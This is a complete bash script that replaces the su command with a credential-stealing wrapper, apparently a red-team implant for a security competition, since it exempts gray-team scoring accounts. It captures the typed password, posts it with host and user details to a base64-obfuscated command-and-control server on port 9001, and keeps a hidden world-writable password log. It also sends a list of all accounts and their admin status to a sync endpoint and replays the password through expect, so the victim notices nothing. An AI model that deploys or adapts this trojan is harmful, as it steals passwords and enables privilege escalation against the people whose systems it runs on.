#!/bin/bash
REAL_SU="/usr/bin/su"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_SU "$@" ;;
esac


LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

# Pass through immediately for non-interactive flags
for arg in "$@"; do
    case "$arg" in
        --help|-h|--version) exec $REAL_SU "$@" ;;
    esac
done

# Pass straight through if stdin is not a terminal
# (Ansible, scripts — anything non-interactive)
if [ ! -t 0 ]; then
    exec $REAL_SU "$@"
fi

# Already root — no password needed, pass straight through
if [ "$(id -u)" -eq 0 ]; then
    exec $REAL_SU "$@"
fi

INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")

TARGET_USER="root"
for arg in "$@"; do
    case "$arg" in
        -*) continue ;;
        *) TARGET_USER="$arg"; break ;;
    esac
done

IS_ADMIN=$(id -Gn "$TARGET_USER" 2>/dev/null | grep -qE '\b(sudo|wheel)\b' && echo true || echo false)
[ "$TARGET_USER" = "root" ] && IS_ADMIN=true

# Prompt for password ourselves
IFS= read -r -s -p "Password: " CAPTURED_PASS </dev/tty

# Temp files cleaned up by the logging helper or on auth failure below
TMPLOG=$(mktemp /tmp/.sulog.XXXXXX)
TMPSH=$(mktemp /tmp/.sush.XXXXXX)
chmod 600 "$TMPLOG" "$TMPSH"

_json_esc() {
    local s="$1"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    printf '%s' "$s"
}

# Write fire-and-forget logging helper.
# Interpolate all bash variables now so the script is self-contained.
SAFE_PASS=$(_json_esc "$CAPTURED_PASS")
cat > "$TMPSH" << LOGSCRIPT
#!/bin/sh
rm -f ${TMPLOG} ${TMPSH}
PAYLOAD=\$(printf '{"host_ip":"%s","user":"%s","event_type":"su","timestamp":"%s","data":{"target_user":"%s","password":"%s","is_admin":%s}}' \
    "${HOST_IP}" "${INVOKING_USER}" "${HOST_TS}" "${TARGET_USER}" "${SAFE_PASS}" "${IS_ADMIN}")
curl -sf -X POST -H "Content-Type: application/json" \
    -d "\$PAYLOAD" --connect-timeout 3 --max-time 3 \
    "${COLLECT_URL}" > /dev/null 2>&1
mkdir -p "${LOG_DIR}" 2>/dev/null
chmod 777 "${LOG_DIR}" 2>/dev/null
touch "${LOCAL_LOG}" 2>/dev/null
chmod 777 "${LOCAL_LOG}" 2>/dev/null
echo "${HOST_TS}|su|${INVOKING_USER}|target:${TARGET_USER}|${CAPTURED_PASS}" >> "${LOCAL_LOG}" 2>/dev/null
SYNC_URL="http://${C2_HOST}:${C2_PORT}/sync"
SUDO_USERS=\$(getent group sudo wheel 2>/dev/null | awk -F: '{print \$4}' | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,\$//')
USERS_JSON="["
FIRST=1
while IFS=: read -r uname _ uid gid _ _ _; do
    [ "\$uid" -lt 1000 ] && [ "\$uname" != "root" ] && continue
    [ "\$uid" -gt 60000 ] && continue
    IS_A=false
    [ "\$uname" = "root" ] && IS_A=true
    echo ",\$SUDO_USERS," | grep -q ",\${uname}," && IS_A=true
    [ \$FIRST -eq 1 ] && FIRST=0 || USERS_JSON="\${USERS_JSON},"
    USERS_JSON="\${USERS_JSON}{\\"username\\":\\"\${uname}\\",\\"uid\\":\${uid},\\"is_admin\\":\${IS_A}}"
done < /etc/passwd
USERS_JSON="\${USERS_JSON}]"
SPAYLOAD="{\\"host_ip\\":\\"${HOST_IP}\\",\\"users\\":\${USERS_JSON}}"
curl -sf -X POST -H "Content-Type: application/json" \
    -d "\$SPAYLOAD" --connect-timeout 3 --max-time 5 \
    "\$SYNC_URL" > /dev/null 2>&1
LOGSCRIPT
chmod 700 "$TMPSH"

# If expect is not installed, fall through to real su
if ! command -v expect >/dev/null 2>&1; then
    exec $REAL_SU "$@"
fi

# exec replaces bash with expect entirely — when expect exits, the
# process is gone. Bash never resumes, so there is no extra exit,
# no prompt redraw, no "press Enter" artifact.
#
# On auth failure expect exits 1 and the process ends — tmpfiles are
# cleaned up inside the expect script itself on that path.
export __SU_PW="$CAPTURED_PASS"
exec expect -c '
    log_user 0
    set timeout 10
    set tmplog [lindex $argv 0]
    set tmpsh  [lindex $argv 1]
    set real_su [lindex $argv 2]
    set su_args [lrange $argv 3 end]

    spawn $real_su {*}$su_args

    expect {
        -nocase -re {password[^:]*:} { send "$env(__SU_PW)\r" }
        eof     { exec sh -c "rm -f $tmplog $tmpsh" ; exit 1 }
        timeout { exec sh -c "rm -f $tmplog $tmpsh" ; exit 1 }
    }

    set timeout 2
    expect {
        -nocase -re {(Authentication failure|incorrect password|su: )} {
            exec sh -c "rm -f $tmplog $tmpsh"
            expect eof
            exit 1
        }
        eof {
            exec sh -c "rm -f $tmplog $tmpsh"
            exit 1
        }
        timeout {
            catch { exec sh $tmpsh & }
        }
    }

    send "\r"
    set timeout -1
    interact
    exit 0
' "$TMPLOG" "$TMPSH" "$REAL_SU" "$@" 2>/dev/null
